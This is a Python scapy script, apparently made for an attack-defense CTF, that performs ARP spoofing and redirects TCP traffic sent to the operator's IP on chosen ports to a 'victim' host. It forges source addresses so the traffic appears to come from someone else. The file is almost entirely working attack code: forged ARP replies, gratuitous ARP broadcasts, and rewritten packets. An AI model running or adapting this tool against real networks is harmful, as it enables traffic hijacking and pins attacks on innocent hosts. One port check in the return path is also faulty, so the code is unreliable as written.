#!/usr/bin/env python3
from scapy.all import *
import threading
import argparse
import signal
import sys
import time

def get_argument():
  parser = argparse.ArgumentParser()
  parser.add_argument('-i', '--interface', help = 'The interface that redirector listen on it')
  parser.add_argument('-H', '--hide-ip', help = 'Our IP address that will hide behind Victim address')
  parser.add_argument('-v', '--victim-ip', help = 'Destination victim IP address that traffic route to that')
  parser.add_argument('-r', '--redirector-ip', help = 'Intermediary IP address for redirection usage')
  parser.add_argument('-e', '--redirector-ethernet', help = 'Intermediary MAC address for redirection usage')
  parser.add_argument('-m', '--masquerade-ip', help = 'Masquerade IP address in the CTF game')
  parser.add_argument('-p', '--ports', help = 'List comma seperated local ports that will hide by redirect traffic to victim (e.g: 10001, 20001)')
  args = parser.parse_args()
  if not args.interface:
    parser.error("[-] Please specify an interface, use --help for more info.")
  elif not args.hide_ip:
    parser.error("[-] Please specify hide IP address, use --help for more info.")
  elif not args.victim_ip:
    parser.error("[-] Please specify victim IP address, use --help for more info.")
  elif not args.redirector_ip:
    parser.error("[-] Please specify redirector IP address, use --help for more info.")
  elif not args.masquerade_ip:
    parser.error("[-] Please specify masquerade ip, use --help for more info.")
  elif not args.ports:
    parser.error("[-] Please specify list of ports, use --help for more info.")
  elif not args.redirector_ethernet:
    parser.error("[-] Please specify redirector MAC address, use --help for more info.")
  return args



def signal_handler(sig, frame):
  print('Exit gracefully')
  sys.exit(0)

def gratuitous_arp():
  g_arp_reflector = Ether(dst=BROADCAST_MAC) / ARP(op=1, psrc=REDIRECTOR_IP, hwsrc=REDIRECTOR_ETHERNET, hwdst=BROADCAST_MAC, pdst=REDIRECTOR_IP)
  while True:
    sendp(g_arp_reflector, iface=LOCAL_INTERFACE, verbose=0)
    time.sleep(1)

def arp_spoof(arp_request):
  if arp_request[ARP].op == 1 and arp_request.haslayer('ARP') and arp_request[ARP].pdst == REDIRECTOR_IP:
    arp_reply = Ether()/ARP()
    arp_reply[Ether].dst = arp_request[Ether].src
    arp_reply[Ether].src = REDIRECTOR_ETHERNET
    arp_reply[ARP].op = 2
    arp_reply[ARP].hwsrc = REDIRECTOR_ETHERNET
    arp_reply[ARP].hwdst = arp_request[ARP].hwsrc
    arp_reply[ARP].psrc = REDIRECTOR_IP
    arp_reply[ARP].pdst = arp_request[ARP].psrc
    sendp(arp_reply, iface=LOCAL_INTERFACE, verbose=0)


def redirect_tcp(rec_packet):
  if rec_packet[IP].dst == HIDE_IP and str(rec_packet[TCP].dport) in PORTS  and rec_packet.haslayer(TCP):
    try:
      packet = IP(dst=VICTIM_IP, src=REDIRECTOR_IP)/TCP()/Raw()
      packet[IP].version = rec_packet[IP].version
      packet[IP].ihl = rec_packet[IP].ihl
      packet[IP].tos = rec_packet[IP].tos
      packet[IP].id = rec_packet[IP].id
      packet[IP].flags = rec_packet[IP].flags
      packet[IP].frag = rec_packet[IP].frag
      packet[IP].ttl = rec_packet[IP].ttl
      packet[IP].proto = rec_packet[IP].proto
      packet[IP].options = rec_packet[IP].options
      packet[TCP].payload = rec_packet[TCP].payload
      packet[TCP].dport = rec_packet[TCP].dport
      packet[TCP].sport = rec_packet[TCP].sport
      packet[TCP].seq = rec_packet[TCP].seq
      packet[TCP].ack = rec_packet[TCP].ack
      packet[TCP].dataofs = rec_packet[TCP].dataofs
      packet[TCP].reserved = rec_packet[TCP].reserved
      packet[TCP].flags = rec_packet[TCP].flags
      packet[TCP].window = rec_packet[TCP].window
      packet[TCP].urgptr = rec_packet[TCP].urgptr
      packet[TCP].options = rec_packet[TCP].options
      del packet[IP].chksum
      del packet[TCP].chksum
      sendp(packet, iface=LOCAL_INTERFACE, verbose=0)
    except:
      print("!")

def sendback_tcp(response):
  if response[IP].dst == REDIRECTOR_IP and str(response[TCP].sport in PORTS)  and response.haslayer(TCP):
    try:
      packet = IP(dst=MASQUERADE_IP, src=HIDE_IP)/TCP()/Raw()
      packet[IP].version = response[IP].version
      packet[IP].ihl = response[IP].ihl
      packet[IP].tos = response[IP].tos
      packet[IP].id = response[IP].id
      packet[IP].flags = response[IP].flags
      packet[IP].frag = response[IP].frag
      packet[IP].ttl = response[IP].ttl
      packet[IP].proto = response[IP].proto
      packet[IP].options = response[IP].options
      packet[TCP].payload = response[TCP].payload
      packet[TCP].dport = response[TCP].dport
      packet[TCP].sport = response[TCP].sport
      packet[TCP].seq = response[TCP].seq
      packet[TCP].ack = response[TCP].ack
      packet[TCP].dataofs = response[TCP].dataofs
      packet[TCP].reserved = response[TCP].reserved
      packet[TCP].flags = response[TCP].flags
      packet[TCP].window = response[TCP].window
      packet[TCP].urgptr = response[TCP].urgptr
      packet[TCP].options = response[TCP].options
      del packet[IP].chksum
      del packet[TCP].chksum
      sendp(packet, iface=LOCAL_INTERFACE, verbose=0)
    except:
      print("!")

def redirect_sniff_tcp():
  sniff(iface=LOCAL_INTERFACE, filter="tcp and dst host " + HIDE_IP, prn=redirect_tcp)

def sendback_sniff_tcp():
  sniff(iface=LOCAL_INTERFACE, filter="tcp and dst host " + REDIRECTOR_IP, prn=sendback_tcp)

def arp_sniff():
  sniff(iface=LOCAL_INTERFACE, filter="arp", prn=arp_spoof)


if __name__ == "__main__":
  signal.signal(signal.SIGINT, signal_handler)
  args = get_argument()
  LOCAL_INTERFACE      = args.interface
  HIDE_IP              = args.hide_ip
  VICTIM_IP            = args.victim_ip
  REDIRECTOR_IP        = args.redirector_ip
  REDIRECTOR_ETHERNET  = args.redirector_ethernet
  MASQUERADE_IP        = args.masquerade_ip
  PORTS                = list(args.ports.split(","))
  BROADCAST_MAC        = 'ff:ff:ff:ff:ff:ff'

  print (LOCAL_INTERFACE, HIDE_IP, VICTIM_IP, REDIRECTOR_IP, PORTS)

  redirect_thread_tcp = threading.Thread(target=redirect_sniff_tcp, args=())
  sendback_thread_tcp = threading.Thread(target=sendback_sniff_tcp, args=())
  arp_sniff_thread = threading.Thread(target=arp_sniff, args=())

  redirect_thread_tcp.start()
  sendback_thread_tcp.start()
  arp_sniff_thread.start()
